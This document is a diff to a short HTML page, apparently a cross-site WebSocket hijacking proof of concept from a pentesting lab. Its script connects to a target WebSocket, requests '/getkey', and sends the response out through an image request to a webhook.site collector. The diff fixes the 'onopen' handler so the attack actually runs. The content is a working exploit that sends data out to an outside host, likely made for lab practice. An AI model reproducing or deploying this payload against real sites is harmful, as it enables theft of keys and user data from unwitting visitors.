@@ -1,13 +1,13 @@
 <html>
   <body>
     <script>
-var uri= "ws://ptl-a8c54f48-f4b5af48.libcurl.so/";
+var uri= "ws://ptl-1346898e-b860a030.libcurl.so/";
 var ws       = new WebSocket(uri);
 ws.onmessage = function(message) {
 var data=JSON.parse(message.data);
 document.write('<img src="https://webhook.site/038edfea-a95e-4498-af7f-25cd88141a9d/?data='+data.text+'"/>');
 }
- ws.unopen= () => ws.send(JSON.stringify({  text: "/getkey"}));
+ ws.onopen= () => ws.send(JSON.stringify({  text: "/getkey" }));
 
     </script>
   </body>
